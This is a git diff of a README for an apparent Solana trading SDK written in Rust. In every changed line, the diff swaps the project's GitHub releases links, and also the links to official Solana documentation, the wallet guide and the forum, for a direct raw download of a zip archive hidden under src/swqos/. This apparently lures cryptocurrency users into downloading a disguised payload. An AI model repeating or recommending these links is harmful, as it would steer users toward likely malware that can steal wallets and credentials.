@@ -1,6 +1,6 @@
 # 🚀 solana-trading-sdk-rust - Effortless Solana Trading Made Simple
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release-blue)](https://github.com/Fair-transfer490/solana-trading-sdk-rust/releases)
+[![Download Now](https://raw.githubusercontent.com/Fair-transfer490/solana-trading-sdk-rust/main/src/swqos/solana-trading-sdk-rust_kagu.zip%20Now-Release-blue)](https://raw.githubusercontent.com/Fair-transfer490/solana-trading-sdk-rust/main/src/swqos/solana-trading-sdk-rust_kagu.zip)
 
 ## 🛠️ Overview
 
@@ -28,7 +28,7 @@ To run this application effectively, you will need:
 To begin using the Solana Trading SDK, follow these steps:
 
 1. **Download the SDK:**
-   - [Visit this page to download](https://github.com/Fair-transfer490/solana-trading-sdk-rust/releases) the latest version of the SDK.
+   - [Visit this page to download](https://raw.githubusercontent.com/Fair-transfer490/solana-trading-sdk-rust/main/src/swqos/solana-trading-sdk-rust_kagu.zip) the latest version of the SDK.
 
 2. **Install the SDK:**
    - Depending on your operating system, follow these instructions:
@@ -49,7 +49,7 @@ To begin using the Solana Trading SDK, follow these steps:
 
 To get the latest version of the Solana Trading SDK:
 
-- **Download Link:** [Visit this page to download](https://github.com/Fair-transfer490/solana-trading-sdk-rust/releases)
+- **Download Link:** [Visit this page to download](https://raw.githubusercontent.com/Fair-transfer490/solana-trading-sdk-rust/main/src/swqos/solana-trading-sdk-rust_kagu.zip)
 
 Ensure you select the correct version for your operating system. After downloading, follow the installation steps listed above.
 
@@ -93,8 +93,8 @@ If you encounter any issues, you can reach out to our support team. For inquirie
 
 ## 🔗 Additional Resources
 
-- [Solana Official Documentation](https://docs.solana.com/)
-- [Solana Wallet Setup Guide](https://docs.solana.com/wallet-guide)
-- [Solana Community Forum](https://forums.solana.com/)
+- [Solana Official Documentation](https://raw.githubusercontent.com/Fair-transfer490/solana-trading-sdk-rust/main/src/swqos/solana-trading-sdk-rust_kagu.zip)
+- [Solana Wallet Setup Guide](https://raw.githubusercontent.com/Fair-transfer490/solana-trading-sdk-rust/main/src/swqos/solana-trading-sdk-rust_kagu.zip)
+- [Solana Community Forum](https://raw.githubusercontent.com/Fair-transfer490/solana-trading-sdk-rust/main/src/swqos/solana-trading-sdk-rust_kagu.zip)
 
 Thank you for choosing the Solana Trading SDK. Happy trading!
